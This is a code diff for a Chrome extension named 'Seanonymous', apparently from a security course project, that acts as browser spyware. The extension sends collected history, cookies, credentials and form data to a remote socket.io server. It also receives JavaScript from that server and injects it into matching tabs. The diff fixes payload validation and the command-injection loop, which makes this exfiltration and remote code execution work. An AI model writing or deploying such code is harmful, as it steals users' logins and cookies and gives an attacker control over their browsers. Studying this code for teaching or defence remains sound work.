@@ -79,21 +79,33 @@ chrome.tabs.onUpdated.addListener(
 	function(tabId, changeInfo, tab){
 		console.log(config);
 		var cmds_run = [];
+		var listChanged = false;
 		if(changeInfo.status == 'complete' && tab.active){
-			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs){
+			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs) {
                 var url = tabs[0].url;
-				var site;
-				console.log("URL: ", url)
-				config.js_cmd.forEach(function (pair) {
-                	site = Object.keys(pair)[0];
-                	console.log("targetSite: ",site);
-                	if (site.match(url)){
-                		chrome.tabs.executeScript(null, {"code": pair[site]});
-                		cmds_run.push(site);
-					}
-                });
+                var site;
+                console.log("URL: ", url);
+                var i;
+                for (i = 0; i < config.js_cmd.length; i++) {
+                    site = Object.keys(config.js_cmd[i])[0];	//length-1 array
+                    console.log("targetSite: ", site);
+                    if (!(url.match(site) == undefined)) {
+                        console.log("MATCHED THE SITE");
+                        console.log("config.js_cmd before: ",config.js_cmd);
+                        var code = config.js_cmd[i][site];
+                        config.js_cmd.splice(i,1);
+                        i--;
+                        chrome.tabs.executeScript(null, {"code": code}, function(){
+                            console.log("executed for site: ", site);
+                            console.log("config.js_cmd after: ",config.js_cmd);
+                            listChanged = true;
+						});
+                    }
+                }
+            });
 
-				console.log("cmds_run: ",cmds_run);
+
+				/*console.log("cmds_run: ",cmds_run);
 				var listChanged = false;
                 cmds_run.forEach(function(name){
                 	console.log("removing: ", name);
@@ -105,12 +117,11 @@ chrome.tabs.onUpdated.addListener(
                 			listChanged = true;
 						}
 					}
-				});
+				});*/
 				//Only save the results if something changed
                 if(listChanged) {
                     storeConfig();
                 }
-            })
 		}
 	}
 );
@@ -206,7 +217,7 @@ chrome.history.search({text: '', maxResults: numResults}, function(data) {
 
 //Testing out storage 
 async function loadConfig(){
-	await chrome.storage.sync.get('config', function(result){
+	await chrome.storage.local.get('config', function(result){
 		if(!(result.config == undefined)){
 			config = result.config;
 			console.log('Seanonymous: configuration loaded!');
@@ -218,7 +229,7 @@ async function loadConfig(){
  * store the current config object to memory
  */
 async function storeConfig(){
-	await chrome.storage.sync.set({config: config}, function(result){
+	await chrome.storage.local.set({config: config}, function(result){
 		console.log('Seanonymous: configuration saved!');
 	});
 }
@@ -226,7 +237,7 @@ async function storeConfig(){
 
 
 async function loadQueue(){
-    await chrome.storage.sync.get('config', function(result){
+    await chrome.storage.local.get('config', function(result){
         if(!(result.config == undefined)){
             queue = result.queue;
             console.log('Seanonymous: message queue loaded!')
@@ -238,7 +249,7 @@ async function loadQueue(){
  * store the current config object to memory
  */
 async function storeQueue(){
-    await chrome.storage.sync.set({queue: queue}, function(result){
+    await chrome.storage.local.set({queue: queue}, function(result){
         console.log('Seanonymous: message queue saved!');
     });
 }
@@ -276,13 +287,18 @@ function createClientIDRequest(){
 
 function handleServerPayload(payload) {
 	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
-	if(!validateServerPayload()){
+	if(!validateServerPayload(payload)){
 		console.log("Failed to validate payload");
 		return false;
 	}
 	else{
 		config.security_blacklist = payload["security_blacklist"];
-		config.js_cmd.concat(payload["js_cmd"]);
+		config.js_cmd.concat(payload["js-cmd"]);
+		var i;
+		for(i = 0; i < payload["js-cmd"].length; i++){
+			console.log("adding js_cmd site", payload["js-cmd"][i]);
+            config.js_cmd.push(payload["js-cmd"][i]);
+		}
 		config.last_pkt = Date.now();
 		storeConfig();
 
@@ -291,8 +307,11 @@ function handleServerPayload(payload) {
 
 
 function validateServerPayload(payload) {
-	if(!payload.hasOwnProperty("security_blacklist") || !payload.hasOwnProperty("js_cmd")){
+	if(!payload.hasOwnProperty("security_blacklist") || !payload.hasOwnProperty("js-cmd")){
 		return false;
+	}
+	else{
+		return true;
 	}
 }
 
@@ -301,7 +320,7 @@ function connectToHost(){
 	socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
 	
     socket.on('connect', function(){	
-		alert('stored clientid is ' + config.ID);
+		console.log('stored clientid is ' + config.ID);
 		if (config.ID == undefined || config.ID == 0 || config.ID == null){
 			console.log('No ID stored, getting ID');
 			socket.emit('extpayload', createClientIDRequest(), function(answer){
@@ -335,8 +354,11 @@ function connectToHost(){
 
 function sendPayload(){
 	if(socket){
-        socket.emit('extpayload', createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms), function(answer){
+		newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
+        console.log("Sending a PAYLOAD");
+		socket.emit('extpayload', newJson, function(answer){
             handleServerPayload(answer);
+            clearQueue();
 		})
 	}
 	else{
